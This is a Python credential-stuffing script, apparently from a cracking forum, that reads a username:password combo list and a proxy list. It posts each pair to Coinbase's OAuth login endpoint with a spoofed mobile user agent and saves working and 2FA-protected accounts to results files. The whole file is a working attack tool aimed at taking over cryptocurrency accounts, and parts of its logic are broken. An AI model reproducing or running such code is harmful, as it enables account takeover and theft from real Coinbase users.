import os
from os import system
import json
try:
  import requests
except:
  system('pip install requests')
  import requests
try:
  import random
except :
  system('pip install random')
  import random
try:
  import time
  from time import sleep
except :
  system('pip install time')
  import time
  from time import sleep
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def coinbase(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'CoinbasePro/1.0.85 (com.coinbase.pro; build:1008501; iOS 15.0)',
      } 
  )
  url = 'https://api.coinbase.com/oauth/authorize/with-credentials'
  data ={"client_id":"2d06b9a69c15e183856ff52c250281f6d93f9abef819921eac0d8647bb2b61f9","password":y,"username":x}

  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'param_required' or 'incorrect_credentials' in r.text:
    status = 'invalid'
  elif 'success' in r.text:
    status = 'valid'
  elif '2fa_required' in r.text:
    status = '2fa'
  else :
    status = 'invalid'
  return status

def proxy_loader(proxyfile):
  lines = open(proxyfile).read().splitlines()
  proxy =random.choice(lines)
  proxies = {"http": proxy}
  return proxies
def retry(x):
  output = proxy_loader()
  output = checker(x,output)

  return output
def combo_loader():
  file = input(bcolors.OKBLUE+('Please input your combo file : '))
  file2 = input(bcolors.OKBLUE+('Please input your proxy file(Only Http) : '))
  try:
    f = open(file, "r")
  except:
    exit()
  for x in f:
    output = proxy_loader(file2)
    output = coinbase(x,output)
    if output == 'valid':
      print(bcolors.OKGREEN+'valid : '+ x ) 
      isdir = os.path.isdir('results')
      if isdir == False :
        os.mkdir('results')
      f = open('results/valid.txt','a+')
      f.write(x+ '\n')
    elif output == 'invalid': 
      print(bcolors.WARNING+'invalid ' + x) 
    elif output == '2fa':
      print(f'{bcolors.WARNING}2fa : {x}')
      isdir = os.path.isdir('results')
      if isdir == False :
        os.mkdir('results')
      f = open('results/2fa.txt','a+')
      f.write(x.strip()+'\n')
    else:
      print('\n')
      


print(bcolors.OKBLUE+'Welcome to coinbase checker by cracked.to/lamlucius8')
sleep(5)


combo_loader()
os.remove("combos.txt")
open('combos.txt','a+')
print(bcolors.OKCYAN+'All valid accounts will be in results folder valid.txt' )
sleep(15)
